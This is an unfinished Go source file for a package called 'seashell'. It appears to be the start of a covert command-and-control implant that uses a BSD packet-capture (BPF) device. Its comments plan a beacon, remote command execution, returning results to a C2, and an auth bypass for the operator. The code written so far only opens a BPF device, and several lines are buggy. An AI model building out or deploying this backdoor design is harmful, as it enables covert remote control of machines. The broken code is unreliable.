package seashell

import (
	"fmt"
	"log"
	"net"
	"os"

	"golang.org/x/sys/"
	"golang.org/x/sys/unix"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

/* general notes:
- will have to attach to bpf device
- will have to generate packet filter
- will need to write beacon
- will need to figure out how to run code
- will need to create structs for sending commands and sending results
- will need to write connection info
- write auth -- as soon as connection is started, request username and password -- otherwise exit
	- have something for the C2 to avoid that. special flag or something
	- probably a future feature

*/

/*

necessary features
1. open the socket -- "golang.org/x/sys/unix"
2. receive packets -- "golang.org/x/sys/unix"
3. parse packets -- google packet
4. run commands -- "golang.org/x/sys/unix"
5. receive command output -- "golang.org/x/sys/unix"
6. build packet -- google packet
7. send packet -- "golang.org/x/sys/unix"
8. send beacon

*/

var debug bool
var wanIntName string = "vtnet0" //update with whatever name the wan interface has


// checkErr checks the error and logs fatal as necessary
func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// bindDevice binds to the first available /dev/bpfX device
/*
*/
func bindDevice() int {
	// BIOCSETIF ioctl
	
	var i int
	var fd int
	var dev string
	var err error

	dev = "/dev/bpf0"
	fd = -1
	
	for {
		dev = fmt.Sprint("/dev/bpf$s", i)
		fd, err = unix.Open(dev, os.O_RDWR, 0644) // open the file and return the file descriptor. update the perms as needed
		if err == nil{
			break
		} else {
			i ++
		}
	}
	if debug == true {
		fmt.Printf("[+] opened: %s", dev)
	}
	return fd
}

// getIFREQ gets the outbound interface Ifreq
func getIFREQ() *sys.Ifreq {
	intface := sys.NewIfreq(wanIntName)
	return intface
}

//not sure why this is currently necessary, but ik that it binds the device to the interface
// oh we can now read and write from the interface. 
// need to get the bpf filter for specific traffic tho
// then need to work on reading packets, and sending packets
// this should probably be in main
func setIoctl() {
	fd := bindDevice()
	intface := getIFREQ()
	unix.IoctlSetInt(fd, unix.BIOCSETF, intface)
}


func readData() {
	// BIOCSETBUFMODE ioctl

}

